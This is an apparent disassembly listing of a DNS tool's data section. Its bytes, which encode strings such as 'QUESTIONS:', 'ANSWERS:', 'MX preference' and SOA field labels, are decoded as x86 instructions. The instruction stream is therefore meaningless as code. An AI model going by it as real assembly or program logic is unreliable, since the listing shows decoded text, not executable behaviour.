  402589:	add    BYTE PTR [eax],al
  40258b:	add    BYTE PTR [ecx],al
  40258d:	add    BYTE PTR [eax],al
  40258f:	add    BYTE PTR [ecx],al
  402591:	add    BYTE PTR [eax],al
  402593:	add    BYTE PTR [ecx],al
  402595:	add    BYTE PTR [eax],al
  402597:	add    BYTE PTR [ecx],al
  402599:	add    BYTE PTR [eax],al
  40259b:	add    BYTE PTR [ecx],al
  40259d:	add    BYTE PTR [eax],al
  40259f:	add    BYTE PTR [ecx],al
  4025a1:	add    BYTE PTR [eax],al
  4025a3:	add    BYTE PTR [ecx],al
  4025a5:	add    BYTE PTR [eax],al
  4025a7:	add    BYTE PTR [ecx],al
  4025a9:	add    BYTE PTR [eax],al
  4025ab:	add    BYTE PTR [ecx],al
  4025ad:	add    BYTE PTR [eax],al
  4025af:	add    BYTE PTR [ecx],al
  4025b1:	add    BYTE PTR [eax],al
  4025b3:	add    BYTE PTR [ecx],al
  4025b5:	add    BYTE PTR [eax],al
  4025b7:	add    BYTE PTR [ecx],al
  4025b9:	add    BYTE PTR [eax],al
  4025bb:	add    BYTE PTR [ecx],al
  4025bd:	add    BYTE PTR [eax],al
  4025bf:	add    BYTE PTR [eax],ah
  4025c1:	and    BYTE PTR [eax],ah
  4025c3:	and    BYTE PTR [eax+0x45],cl
  4025c6:	inc    ecx
  4025c7:	inc    esp
  4025c8:	inc    ebp
  4025c9:	push   edx
  4025ca:	cmp    cl,BYTE PTR [edx]
  4025cc:	add    BYTE PTR [eax],al
  4025ce:	add    BYTE PTR [eax],al
  4025d0:	or     DWORD PTR [edi+0x70],ebp
  4025d3:	arpl   WORD PTR [edi+0x64],bp
  4025d6:	and    BYTE PTR gs:0x732520,bh
  4025dd:	add    BYTE PTR [eax],al
  4025df:	add    BYTE PTR [eax+eiz*1],ch
  4025e2:	imul   esp,DWORD PTR [eax+eiz*1+0x3d],0x642520
  4025ea:	add    BYTE PTR [eax],al
  4025ec:	sub    al,0x20
  4025ee:	jb     0x402653
  4025f0:	outs   dx,DWORD PTR ds:[esi]
  4025f1:	fs and BYTE PTR gs:0xa732520,bh
  4025f9:	add    BYTE PTR [eax],al
  4025fb:	add    BYTE PTR [ecx],cl
  4025fd:	push   0x65646165
  402602:	jb     0x402624
  402604:	data16 ins BYTE PTR es:[edi],dx
  402606:	popa   
  402607:	addr16 jae 0x402644
  40260a:	and    BYTE PTR [eax],al
  40260c:	and    BYTE PTR [edx+0x65],dh
  40260f:	jae    0x402681
  402611:	outs   dx,DWORD PTR ds:[esi]
  402612:	outs   dx,BYTE PTR ds:[esi]
  402613:	jae    0x40267a
  402615:	add    BYTE PTR [eax],al
  402617:	add    BYTE PTR [eax],ah
  402619:	jno    0x402690
  40261b:	gs jb  0x402697
  40261e:	add    BYTE PTR [eax],al
  402620:	sub    al,0x20
  402622:	popa   
  402623:	jne    0x402699
  402625:	push   0x6e61202e
  40262a:	jae    0x4026a3
  40262c:	gs jb  0x40262f
  40262f:	add    BYTE PTR [eax+eiz*1],ch
  402632:	je     0x4026a6
  402634:	jne    0x4026a4
  402636:	arpl   WORD PTR [ecx+0x74],sp
  402639:	imul   ebp,DWORD PTR [edi+0x6e],0x0
  402640:	sub    al,0x20
  402642:	ja     0x4026a5
  402644:	outs   dx,BYTE PTR ds:[esi]
  402645:	je     0x402667
  402647:	jb     0x4026ae
  402649:	arpl   WORD PTR [ebp+0x72],si
  40264c:	jae    0x4026b7
  40264e:	outs   dx,DWORD PTR ds:[esi]
  40264f:	outs   dx,BYTE PTR ds:[esi]
  402650:	add    BYTE PTR [eax],al
  402652:	add    BYTE PTR [eax],al
  402654:	sub    al,0x20
  402656:	jb     0x4026bd
  402658:	arpl   WORD PTR [ebp+0x72],si
  40265b:	jae    0x4026c6
  40265d:	outs   dx,DWORD PTR ds:[esi]
  40265e:	outs   dx,BYTE PTR ds:[esi]
  40265f:	and    BYTE PTR [ecx+0x76],ah
  402662:	popa   
  402663:	imul   ebp,DWORD PTR [esi+ebp*1+0x0],0x70202c00
  40266b:	jb     0x4026d6
  40266d:	ins    DWORD PTR es:[edi],dx
  40266e:	popa   
  40266f:	jb     0x4026ea
  402671:	add    BYTE PTR [eax],al
  402673:	add    BYTE PTR [edx],cl
  402675:	or     DWORD PTR [ecx+0x75],esi
  402678:	gs jae 0x4026ef
  40267b:	imul   ebp,DWORD PTR [edi+0x6e],0x203d2073
  402682:	and    eax,0x64
  402687:	add    BYTE PTR [eax+eiz*1],ch
  40268a:	and    BYTE PTR [ecx+0x6e],ah
  40268d:	jae    0x402706
  40268f:	gs jb  0x402705
  402692:	and    BYTE PTR ds:0x642520,bh
  402698:	sub    al,0x20
  40269a:	and    BYTE PTR [ecx+0x75],ah
  40269d:	je     0x402707
  40269f:	outs   dx,DWORD PTR ds:[esi]
  4026a0:	jb     0x40270b
  4026a2:	je     0x40271d
  4026a4:	and    BYTE PTR [edx+0x65],dh
  4026a7:	arpl   WORD PTR [edi+0x72],bp
  4026aa:	fs jae 0x4026cd
  4026ad:	cmp    eax,0x642520
  4026b2:	add    BYTE PTR [eax],al
  4026b4:	sub    al,0x20
  4026b6:	and    BYTE PTR [ecx+0x64],ah
  4026b9:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x206c616e
  4026c2:	cmp    eax,0xa642520
  4026c7:	or     al,BYTE PTR [eax]
  4026c9:	add    BYTE PTR [eax],al
  4026cb:	add    BYTE PTR [eax],ah
  4026cd:	and    BYTE PTR [eax],ah
  4026cf:	and    BYTE PTR [ecx+0x55],dl
  4026d2:	inc    ebp
  4026d3:	push   ebx
  4026d4:	push   esp
  4026d5:	dec    ecx
  4026d6:	dec    edi
  4026d7:	dec    esi
  4026d8:	push   ebx
  4026d9:	cmp    cl,BYTE PTR [edx]
  4026db:	add    BYTE PTR [ecx],cl
  4026dd:	add    BYTE PTR [eax],al
  4026df:	add    BYTE PTR [eax+eiz*1],ch
  4026e2:	je     0x40275d
  4026e4:	jo     0x40274b
  4026e6:	and    BYTE PTR ds:0x732520,bh
  4026ec:	sub    al,0x20
  4026ee:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  4026f2:	jae    0x402714
  4026f4:	cmp    eax,0xa732520
  4026f9:	add    BYTE PTR [eax],al
  4026fb:	add    BYTE PTR [eax],ah
  4026fd:	and    BYTE PTR [eax],ah
  4026ff:	and    BYTE PTR [ecx+0x4e],al
  402702:	push   ebx
  402703:	push   edi
  402704:	inc    ebp
  402705:	push   edx
  402706:	push   ebx
  402707:	cmp    cl,BYTE PTR [edx]
  402709:	add    BYTE PTR [eax],al
  40270b:	add    BYTE PTR [eax],ah
  40270d:	and    BYTE PTR [eax],ah
  40270f:	and    BYTE PTR ds:0x20203e,ch
  402715:	add    BYTE PTR [eax],al
  402717:	add    BYTE PTR [eax],ah
  402719:	and    BYTE PTR [eax],ah
  40271b:	and    BYTE PTR [ecx+0x55],al
  40271e:	push   esp
  40271f:	dec    eax
  402720:	dec    edi
  402721:	push   edx
  402722:	dec    ecx
  402723:	push   esp
  402724:	pop    ecx
  402725:	and    BYTE PTR [edx+0x45],dl
  402728:	inc    ebx
  402729:	dec    edi
  40272a:	push   edx
  40272b:	inc    esp
  40272c:	push   ebx
  40272d:	cmp    cl,BYTE PTR [edx]
  40272f:	add    BYTE PTR [eax],ah
  402731:	and    BYTE PTR [eax],ah
  402733:	and    BYTE PTR [ecx+0x44],al
  402736:	inc    esp
  402737:	dec    ecx
  402738:	push   esp
  402739:	dec    ecx
  40273a:	dec    edi
  40273b:	dec    esi
  40273c:	inc    ecx
  40273d:	dec    esp
  40273e:	and    BYTE PTR [edx+0x45],dl
  402741:	inc    ebx
  402742:	dec    edi
  402743:	push   edx
  402744:	inc    esp
  402745:	push   ebx
  402746:	cmp    cl,BYTE PTR [edx]
  402748:	add    BYTE PTR [eax],al
  40274a:	add    BYTE PTR [eax],al
  40274c:	or     ch,BYTE PTR ds:0x2d2d2d2d
  402752:	sub    eax,0x2d2d2d2d
  402757:	sub    eax,0xa2d
  40275c:	dec    ecx
  40275d:	outs   dx,BYTE PTR ds:[esi]
  40275e:	jbe    0x4027c1
  402760:	ins    BYTE PTR es:[edi],dx
  402761:	imul   esp,DWORD PTR [eax+eiz*1+0x4e],0x20656d61
  402769:	popa   
  40276a:	je     0x40278c
  40276c:	outs   dx,DWORD PTR ds:[esi]
  40276d:	data16 data16 jae 0x4027d6
  402771:	je     0x402793
  402773:	and    eax,0xa216449
  402778:	add    BYTE PTR [eax],al
  40277a:	add    BYTE PTR [eax],al
  40277c:	sub    BYTE PTR [edx+0x6f],dh
  40277f:	outs   dx,DWORD PTR ds:[esi]
  402780:	je     0x4027ab
  402782:	add    BYTE PTR [eax],al
  402784:	and    eax,0x7330332d
  402789:	add    BYTE PTR [eax],al
  40278b:	add    BYTE PTR [eax],ch
  40278d:	outs   dx,BYTE PTR ds:[esi]
  40278e:	popa   
  40278f:	ins    DWORD PTR es:[edi],dx
  402790:	and    BYTE PTR gs:[edx+esi*2+0x75],dh
  402795:	outs   dx,BYTE PTR ds:[esi]
  402796:	arpl   WORD PTR [ecx+0x74],sp
  402799:	gs fs aas 
  40279c:	sub    DWORD PTR [edx],ecx
  40279e:	add    BYTE PTR [eax],al
  4027a0:	or     cl,BYTE PTR [ecx]
  4027a2:	je     0x40281d
  4027a4:	jo     0x40280b
  4027a6:	and    BYTE PTR ds:0x2c732520,bh
  4027ac:	and    BYTE PTR [ebx+0x6c],ah
  4027af:	popa   
  4027b0:	jae    0x402825
  4027b2:	and    BYTE PTR ds:0x2c732520,bh
  4027b8:	and    BYTE PTR [esp+ebp*2+0x65],ah
  4027bc:	outs   dx,BYTE PTR ds:[esi]
  4027bd:	and    BYTE PTR ds:0x642520,bh
  4027c3:	add    BYTE PTR [edx],cl
  4027c5:	or     DWORD PTR [esp+esi*2+0x6c],esi
  4027c9:	and    BYTE PTR ds:0x756c2520,bh
  4027cf:	and    BYTE PTR [eax],ch
  4027d1:	and    eax,0x2973
  4027d6:	add    BYTE PTR [eax],al
  4027d8:	or     DWORD PTR [ecx+0x6e],ebp
  4027db:	je     0x402842
  4027dd:	jb     0x40284d
  4027df:	gs je  0x402802
  4027e2:	popa   
  4027e3:	fs fs jb 0x40284c
  4027e7:	jae    0x40285c
  4027e9:	and    BYTE PTR ds:0xa732520,bh
  4027ef:	add    BYTE PTR [ecx],cl
  4027f1:	imul   ebp,DWORD PTR [esi+0x74],0x656e7265
  4027f8:	je     0x40281a
  4027fa:	popa   
  4027fb:	fs fs jb 0x402864
  4027ff:	jae    0x402874
  402801:	and    BYTE PTR ds:0x732520,bh
  402807:	add    BYTE PTR [eax+eiz*1],ch
  40280a:	jo     0x40287e
  40280c:	outs   dx,DWORD PTR ds:[esi]
  40280d:	je     0x40287e
  40280f:	arpl   WORD PTR [edi+0x6c],bp
  402812:	and    BYTE PTR ds:0x642520,bh
  402818:	sub    al,0x20
  40281a:	jo     0x40288b
  40281c:	jb     0x402892
  40281e:	and    BYTE PTR ds:0xa642520,bh
  402824:	add    BYTE PTR [eax],al
  402826:	add    BYTE PTR [eax],al
  402828:	or     DWORD PTR [ecx+0x64],esp
  40282b:	fs jb  0x402893
  40282e:	jae    0x4028a3
  402830:	sub    al,0x20
  402832:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  402836:	jae    0x402858
  402838:	cmp    eax,0x2c642520
  40283d:	and    BYTE PTR [ebp+eiz*2+0x6e],ch
  402841:	and    BYTE PTR ds:0xa642520,bh
  402847:	add    BYTE PTR [ecx],cl
  402849:	arpl   WORD PTR [ecx+0x6e],sp
  40284c:	outs   dx,DWORD PTR ds:[esi]
  40284d:	outs   dx,BYTE PTR ds:[esi]
  40284e:	imul   esp,DWORD PTR [ebx+0x61],0x616e206c
  402855:	ins    DWORD PTR es:[edi],dx
  402856:	and    BYTE PTR gs:0x9000020,bh
  40285d:	outs   dx,DWORD PTR fs:[esi]
  40285f:	ins    DWORD PTR es:[edi],dx
  402860:	popa   
  402861:	imul   ebp,DWORD PTR [esi+0x20],0x656d616e
  402868:	and    BYTE PTR [eax],ch
  40286a:	inc    esp
  40286b:	dec    esi
  40286c:	inc    ecx
  40286d:	dec    ebp
  40286e:	inc    ebp
  40286f:	sub    DWORD PTR [eax],esp
  402871:	cmp    eax,0x41090020
  402876:	inc    esi
  402877:	push   ebx
  402878:	inc    esp
  402879:	inc    edx
  40287a:	and    BYTE PTR [ebx+0x75],dh
  40287d:	bound  esi,QWORD PTR [ecx+edi*2+0x70]
  402881:	and    BYTE PTR gs:0x642520,bh
  402888:	sub    al,0x20
  40288a:	inc    ecx
  40288b:	inc    esi
  40288c:	push   ebx
  40288d:	and    BYTE PTR [edx+eiz*2+0x20],ah
  402891:	jae    0x4028f8
  402893:	jb     0x40290b
  402895:	gs jb  0x4028b8
  402898:	cmp    eax,0x9000020
  40289d:	ins    DWORD PTR es:[edi],dx
  40289e:	popa   
  40289f:	imul   ebp,DWORD PTR [eax+eiz*1+0x67],0x70756f72
  4028a7:	and    BYTE PTR [ebp+0x65],ch
  4028aa:	ins    DWORD PTR es:[edi],dx
  4028ab:	bound  esp,QWORD PTR [ebp+0x72]
  4028ae:	and    BYTE PTR ds:0x20,bh
  4028b4:	or     DWORD PTR [ebp+0x61],ebp
  4028b7:	imul   ebp,DWORD PTR [eax+eiz*1+0x62],0x3d20786f
  4028bf:	and    BYTE PTR [eax],al
  4028c1:	add    BYTE PTR [eax],al
  4028c3:	add    BYTE PTR [ecx],cl
  4028c5:	ins    DWORD PTR es:[edi],dx
  4028c6:	popa   
  4028c7:	imul   ebp,DWORD PTR [edx+eiz*2+0x6f],0x65722078
  4028cf:	outs   dx,BYTE PTR ds:[esi]
  4028d0:	popa   
  4028d1:	ins    DWORD PTR es:[edi],dx
  4028d2:	and    BYTE PTR gs:0x9000020,bh
  4028d9:	dec    ebp
  4028da:	pop    eax
  4028db:	and    BYTE PTR [eax+0x72],dh
  4028de:	gs data16 gs jb 0x402948
  4028e3:	outs   dx,BYTE PTR ds:[esi]
  4028e4:	arpl   WORD PTR [ebp+0x20],sp
  4028e7:	cmp    eax,0x752520
  4028ec:	sub    al,0x20
  4028ee:	ins    DWORD PTR es:[edi],dx
  4028ef:	popa   
  4028f0:	imul   ebp,DWORD PTR [eax+eiz*1+0x65],0x61686378
  4028f8:	outs   dx,BYTE PTR ds:[esi]
  4028f9:	addr16 gs jb 0x40291d
  4028fd:	cmp    eax,0x6e090020
  402902:	popa   
  402903:	ins    DWORD PTR es:[edi],dx
  402904:	gs jae 0x40296c
  402907:	jb     0x40297f
  402909:	gs jb  0x40292c
  40290c:	cmp    eax,0x9000020
  402911:	outs   dx,BYTE PTR ds:[esi]
  402912:	popa   
  402913:	ins    DWORD PTR es:[edi],dx
  402914:	and    BYTE PTR gs:0x20,bh
  40291b:	add    BYTE PTR [ecx],cl
  40291d:	dec    eax
  40291e:	dec    ecx
  40291f:	dec    esi
  402920:	inc    esi
  402921:	dec    edi
  402922:	and    BYTE PTR [ebx+0x50],al
  402925:	push   ebp
  402926:	and    BYTE PTR ds:0x2a2e2520,bh
  40292c:	jae    0x40292e
  40292e:	add    BYTE PTR [eax],al
  402930:	or     DWORD PTR [edi+0x53],ecx
  402933:	and    BYTE PTR ds:0x2a2e2520,bh
  402939:	jae    0x402945
  40293b:	add    BYTE PTR [ecx],cl
  40293d:	jo     0x4029b1
  40293f:	imul   ebp,DWORD PTR [ebp+0x61],0x6e207972
  402946:	popa   
  402947:	ins    DWORD PTR es:[edi],dx
  402948:	and    BYTE PTR gs:[ebx+0x65],dh
  40294c:	jb     0x4029c4
  40294e:	gs jb  0x402971
  402951:	cmp    eax,0x90a0020
  402956:	jb     0x4029bd
  402958:	jae    0x4029ca
  40295a:	outs   dx,DWORD PTR ds:[esi]
  40295b:	outs   dx,BYTE PTR ds:[esi]
  40295c:	jae    0x4029c7
  40295e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  402962:	ins    DWORD PTR es:[edi],dx
  402963:	popa   
  402964:	imul   ebp,DWORD PTR [eax+eiz*1+0x61],0x20726464
  40296c:	cmp    eax,0xa000020
  402971:	or     DWORD PTR [ebx+0x65],esi
  402974:	jb     0x4029df
  402976:	popa   
  402977:	ins    BYTE PTR es:[edi],dx
  402978:	and    BYTE PTR [eax],ah
  40297a:	cmp    eax,0x756c2520
  40297f:	add    BYTE PTR [edx],cl
  402981:	or     DWORD PTR [edx+0x65],esi
  402984:	data16 jb 0x4029ec
  402987:	jae    0x4029f1
  402989:	and    BYTE PTR ds:0x756c2520,bh
  40298f:	and    BYTE PTR [eax],ch
  402991:	and    eax,0x2973
  402996:	add    BYTE PTR [eax],al
  402998:	or     cl,BYTE PTR [ecx]
  40299a:	jb     0x402a01
  40299c:	je     0x402a10
  40299e:	jns    0x4029c0
  4029a0:	and    BYTE PTR [eax],ah
  4029a2:	cmp    eax,0x756c2520
  4029a7:	and    BYTE PTR [eax],ch
  4029a9:	and    eax,0x2973
  4029ae:	add    BYTE PTR [eax],al
  4029b0:	or     cl,BYTE PTR [ecx]
  4029b2:	gs js  0x402a25
  4029b5:	imul   esi,DWORD PTR [edx+0x65],0x203d2020
  4029bc:	and    eax,0x2820756c
  4029c1:	and    eax,0x2973
  4029c6:	add    BYTE PTR [eax],al
  4029c8:	or     cl,BYTE PTR [ecx]
  4029ca:	fs gs popaw 
  4029ce:	jne    0x402a3c
  4029d0:	je     0x4029f2
  4029d2:	push   esp
  4029d3:	push   esp
  4029d4:	dec    esp
  4029d5:	and    BYTE PTR ds:0x756c2520,bh
  4029db:	and    BYTE PTR [eax],ch
  4029dd:	and    eax,0xa2973
  4029e2:	add    BYTE PTR [eax],al
  4029e4:	or     DWORD PTR [ebp+0x49],ecx
  4029e7:	dec    esi
  4029e8:	inc    esi
  4029e9:	dec    edi
  4029ea:	and    BYTE PTR [edx+0x65],dh
  4029ed:	jae    0x402a5f
  4029ef:	outs   dx,DWORD PTR ds:[esi]
  4029f0:	outs   dx,BYTE PTR ds:[esi]
  4029f1:	jae    0x402a5c
  4029f3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  4029f7:	ins    DWORD PTR es:[edi],dx
  4029f8:	popa   
  4029f9:	imul   ebp,DWORD PTR [edx+eiz*2+0x6f],0x203d2078
  402a01:	add    BYTE PTR [eax],al
  402a03:	add    BYTE PTR [edx],cl
  402a05:	or     DWORD PTR [ebp+0x72],esp
  402a08:	jb     0x402a79
  402a0a:	jb     0x402a7f
  402a0c:	and    BYTE PTR [edi+ebp*2+0x20],dh
  402a10:	ins    DWORD PTR es:[edi],dx
  402a11:	popa   
  402a12:	imul   ebp,DWORD PTR [edx+eiz*2+0x6f],0x203d2078
  402a1a:	add    BYTE PTR [eax],al
  402a1c:	or     DWORD PTR [ebp+eiz*2+0x78],esi
  402a20:	je     0x402a42
  402a22:	cmp    eax,0xa
  402a27:	add    BYTE PTR [edx],cl
  402a29:	or     DWORD PTR [edx],esp
  402a2b:	and    eax,0x22732a2e
  402a30:	add    BYTE PTR [eax],al
  402a32:	add    BYTE PTR [eax],al
  402a34:	or     al,BYTE PTR [eax]
  402a36:	add    BYTE PTR [eax],al
  402a38:	or     DWORD PTR [ebp+0x73],esi
  402a3b:	gs jb  0x402a5e
  402a3e:	imul   ebp,DWORD PTR [esi+0x66],0x203d206f
  402a45:	and    eax,0xa73
  402a4a:	add    BYTE PTR [eax],al
  402a4c:	or     DWORD PTR ds:0x20646963,esp
  402a52:	cmp    eax,0x756c2520
  402a57:	or     al,BYTE PTR [eax]
  402a59:	add    BYTE PTR [eax],al
  402a5b:	add    BYTE PTR [ecx],cl
  402a5d:	and    eax,0x20646963
  402a62:	outs   dx,DWORD PTR ds:[esi]
  402a63:	data16 and BYTE PTR [ebp+eiz*2+0x6e],ch
  402a68:	addr16 je 0x402ad3
  402a6b:	and    BYTE PTR ds:0xa3f64,ah
  402a71:	add    BYTE PTR [eax],al
  402a73:	add    BYTE PTR [ecx],cl
  402a75:	imul   ebp,DWORD PTR [esi+0x65],0x64612074
  402a7c:	fs jb  0x402ae4
  402a7f:	jae    0x402af4
  402a81:	and    BYTE PTR ds:0x2c732520,bh
  402a87:	and    BYTE PTR [eax+0x72],dh
  402a8a:	outs   dx,DWORD PTR ds:[esi]
  402a8b:	je     0x402afc
  402a8d:	arpl   WORD PTR [edi+0x6c],bp
  402a90:	and    BYTE PTR ds:0xa732520,bh
  402a96:	or     DWORD PTR [eax],eax
  402a98:	or     DWORD PTR [ecx+0x6e],ebp
  402a9b:	gs je  0x402abe
  402a9e:	popa   
  402a9f:	fs fs jb 0x402b08
  402aa3:	jae    0x402b18
  402aa5:	and    BYTE PTR ds:0x2c732520,bh
  402aab:	and    BYTE PTR [eax+0x72],dh
  402aae:	outs   dx,DWORD PTR ds:[esi]
  402aaf:	je     0x402b20
  402ab1:	arpl   WORD PTR [edi+0x6c],bp
  402ab4:	and    BYTE PTR ds:0xa642520,bh
  402aba:	or     DWORD PTR [eax],eax
  402abc:	and    BYTE PTR [eax],ah
  402abe:	and    eax,0x73
  402ac3:	add    BYTE PTR [eax],ah
  402ac5:	and    esp,DWORD PTR ds:0x64
  402acb:	add    BYTE PTR [ecx],cl
  402acd:	dec    esi
  402ace:	push   ebp
  402acf:	dec    esp
  402ad0:	dec    esp
  402ad1:	and    BYTE PTR [eax],ch
  402ad3:	fs ins BYTE PTR es:[edi],dx
  402ad5:	outs   dx,BYTE PTR gs:[esi]
  402ad7:	and    BYTE PTR ds:0xa2964,ah
  402add:	add    BYTE PTR [eax],al
  402adf:	add    BYTE PTR [ecx],cl
  402ae1:	pop    eax
  402ae2:	xor    dh,BYTE PTR ds:0x312e5820
  402ae8:	xor    dh,BYTE PTR [ecx]
  402aea:	and    BYTE PTR [ecx+0x64],ah
  402aed:	fs jb  0x402b55
  402af0:	jae    0x402b65
  402af2:	and    BYTE PTR ds:0x2a2e2520,bh
  402af8:	jae    0x402b04
  402afa:	add    BYTE PTR [eax],al
  402afc:	or     DWORD PTR [edx+0x54],edx
  402aff:	and    BYTE PTR [eax+0x72],dh
  402b02:	gs data16 gs jb 0x402b6c
  402b07:	outs   dx,BYTE PTR ds:[esi]
  402b08:	arpl   WORD PTR [ebp+0x20],sp
  402b0b:	cmp    eax,0x752520
  402b10:	sub    al,0x20
  402b12:	imul   ebp,DWORD PTR [esi+0x74],0x656d7265
  402b19:	imul   esp,DWORD PTR fs:[ecx+0x74],0x6f682065
  402b21:	jae    0x402b97
  402b23:	and    BYTE PTR ds:0x9000020,bh
  402b29:	dec    ecx
  402b2a:	push   ebx
  402b2b:	inc    esp
  402b2c:	dec    esi
  402b2d:	and    BYTE PTR [ecx+0x64],ah
  402b30:	fs jb  0x402b98
  402b33:	jae    0x402ba8
  402b35:	and    BYTE PTR ds:0x2a2e2520,bh
  402b3b:	jae    0x402b3d
  402b3d:	add    BYTE PTR [eax],al
  402b3f:	add    BYTE PTR [ecx],cl
  402b41:	jae    0x402bb8
  402b43:	bound  esp,QWORD PTR [ecx+0x64]
  402b46:	fs jb  0x402bae
  402b49:	jae    0x402bbe
  402b4b:	and    BYTE PTR ds:0x2a2e2520,bh
  402b51:	jae    0x402b5d
  402b53:	add    BYTE PTR [ecx],cl
  402b55:	push   edx
  402b56:	push   eax
  402b57:	and    BYTE PTR [ebp+0x61],ch
  402b5a:	imul   ebp,DWORD PTR [edx+eiz*2+0x6f],0x203d2078
  402b62:	add    BYTE PTR [eax],al
  402b64:	or     cl,BYTE PTR [ecx]
  402b66:	je     0x402bcd
  402b68:	js     0x402bde
  402b6a:	and    BYTE PTR [edi+ebp*2+0x63],ch
  402b6e:	popa   
  402b6f:	je     0x402bda
  402b71:	outs   dx,DWORD PTR ds:[esi]
  402b72:	outs   dx,BYTE PTR ds:[esi]
  402b73:	and    BYTE PTR ds:0x41000020,bh
  402b79:	inc    ecx
  402b7a:	inc    ecx
  402b7b:	inc    ecx
  402b7c:	cmp    ah,BYTE PTR [eax]
  402b7e:	and    BYTE PTR [ecx+0x6e],cl
  402b81:	jbe    0x402be4
  402b83:	ins    BYTE PTR es:[edi],dx
  402b84:	imul   esp,DWORD PTR [eax+eiz*1+0x49],0x20367650
  402b8c:	popa   
  402b8d:	fs fs jb 0x402bf6
  402b91:	jae    0x402c06
  402b93:	and    BYTE PTR [ebp+eiz*2+0x6e],ch
  402b97:	addr16 je 0x402c02
  402b9a:	or     al,BYTE PTR [eax]
  402b9c:	or     DWORD PTR [ecx+0x41],eax
  402b9f:	inc    ecx
  402ba0:	inc    ecx
  402ba1:	and    BYTE PTR [ecx+0x50],cl
  402ba4:	jbe    0x402bdc
  402ba6:	and    BYTE PTR [ecx+0x64],ah
  402ba9:	fs jb  0x402c11
  402bac:	jae    0x402c21
  402bae:	and    BYTE PTR ds:0xa732520,bh
  402bb4:	add    BYTE PTR [eax],al
  402bb6:	add    BYTE PTR [eax],al
  402bb8:	or     DWORD PTR [ebx+0x52],edx
  402bbb:	push   esi
  402bbc:	and    BYTE PTR [ebx+0x65],dh
  402bbf:	jb     0x402c37
  402bc1:	imul   esp,DWORD PTR [ebx+0x65],0x636f6c20
  402bc8:	popa   
  402bc9:	je     0x402c34
  402bcb:	outs   dx,DWORD PTR ds:[esi]
  402bcc:	outs   dx,BYTE PTR ds:[esi]
  402bcd:	cmp    cl,BYTE PTR [edx]
  402bcf:	or     DWORD PTR [eax],esp
  402bd1:	and    BYTE PTR [eax+0x72],dh
  402bd4:	imul   ebp,DWORD PTR [edi+0x72],0x20797469
  402bdb:	and    BYTE PTR [eax],ah
  402bdd:	and    BYTE PTR [eax],ah
  402bdf:	and    BYTE PTR [eax],ah
  402be1:	cmp    eax,0xa642520
  402be6:	or     DWORD PTR [eax],esp
  402be8:	and    BYTE PTR [edi+0x65],dh
  402beb:	imul   esp,DWORD PTR [edi+0x68],0x20202074
  402bf2:	and    BYTE PTR [eax],ah
  402bf4:	and    BYTE PTR [eax],ah
  402bf6:	and    BYTE PTR [eax],ah
  402bf8:	cmp    eax,0xa642520
  402bfd:	or     DWORD PTR [eax],esp
  402bff:	and    BYTE PTR [eax+0x6f],dh
  402c02:	jb     0x402c78
  402c04:	and    BYTE PTR [eax],ah
  402c06:	and    BYTE PTR [eax],ah
  402c08:	and    BYTE PTR [eax],ah
  402c0a:	and    BYTE PTR [eax],ah
  402c0c:	and    BYTE PTR [eax],ah
  402c0e:	and    BYTE PTR ds:0xa642520,bh
  402c14:	or     DWORD PTR [eax],esp
  402c16:	and    BYTE PTR [ebx+0x76],dh
  402c19:	jb     0x402c3b
  402c1b:	push   0x6e74736f
  402c20:	popa   
  402c21:	ins    DWORD PTR es:[edi],dx
  402c22:	and    BYTE PTR gs:[eax],ah
  402c25:	and    BYTE PTR ds:0x20,bh
  402c2b:	add    BYTE PTR [edi+ebp*2+0x63],ch
  402c2f:	popa   
  402c30:	ins    BYTE PTR es:[edi],dx
  402c31:	add    BYTE PTR [eax],al
  402c33:	add    BYTE PTR [ebx+0x63],dh
  402c36:	outs   dx,DWORD PTR ds:[esi]
  402c37:	jo     0x402c9e
  402c39:	add    BYTE PTR [eax],al
  402c3b:	add    BYTE PTR [eax],al
  402c3d:	add    BYTE PTR [eax],al
  402c3f:	add    BYTE PTR [edx],cl
  402c41:	or     DWORD PTR [edi+0x49],edx
  402c44:	dec    esi
  402c45:	push   ebx
  402c46:	and    BYTE PTR [edi+ebp*2+0x6f],ch
  402c4a:	imul   esi,DWORD PTR [ebp+0x70],0xa
  402c4e:	or     DWORD PTR [eax],esp
  402c50:	and    BYTE PTR [esi+0x6c],ah
  402c53:	popa   
  402c54:	addr16 jae 0x402c77
  402c57:	cmp    eax,0x786c2520
  402c5c:	and    BYTE PTR [eax],ch
  402c5e:	and    eax,0x73252073
  402c63:	sub    DWORD PTR [edx],ecx
  402c65:	or     DWORD PTR [eax],esp
  402c67:	and    BYTE PTR [edi+ebp*2+0x6f],ch
  402c6b:	imul   esi,DWORD PTR [ebp+0x70],0x20
  402c6f:	je     0x402cda
  402c71:	ins    DWORD PTR es:[edi],dx
  402c72:	outs   dx,DWORD PTR gs:[esi]
  402c74:	jne    0x402cea
  402c76:	and    BYTE PTR ds:0x756c2520,bh
  402c7c:	or     cl,BYTE PTR [ecx]
  402c7e:	and    BYTE PTR [eax],ah
  402c80:	arpl   WORD PTR [ecx+0x63],sp
  402c83:	push   0x54542065
  402c88:	dec    esp
  402c89:	and    BYTE PTR [eax],ah
  402c8b:	and    BYTE PTR [eax],ah
  402c8d:	and    BYTE PTR [eax],ah
  402c8f:	cmp    eax,0x756c2520
  402c94:	or     cl,BYTE PTR [ecx]
  402c96:	and    BYTE PTR [eax],ah
  402c98:	jae    0x402cff
  402c9a:	jb     0x402d12
  402c9c:	gs jb  0x402cbf
  402c9f:	arpl   WORD PTR [edi+0x75],bp
  402ca2:	outs   dx,BYTE PTR ds:[esi]
  402ca3:	je     0x402cc5
  402ca5:	and    BYTE PTR [eax],ah
  402ca7:	cmp    eax,0x756c2520
  402cac:	or     al,BYTE PTR [eax]
  402cae:	add    BYTE PTR [eax],al
  402cb0:	or     DWORD PTR [eax],esp
  402cb2:	and    BYTE PTR [edi+0x49],dl
  402cb5:	dec    esi
  402cb6:	push   ebx
  402cb7:	and    BYTE PTR [ebx+0x65],dh
  402cba:	jb     0x402d32
  402cbc:	gs jb  0x402cdf
  402cbf:	cmp    eax,0x73252820
  402cc4:	sub    DWORD PTR [edx],ecx
  402cc6:	add    BYTE PTR [eax],al
  402cc8:	or     cl,BYTE PTR [ecx]
  402cca:	push   edi
  402ccb:	dec    ecx
  402ccc:	dec    esi
  402ccd:	push   ebx
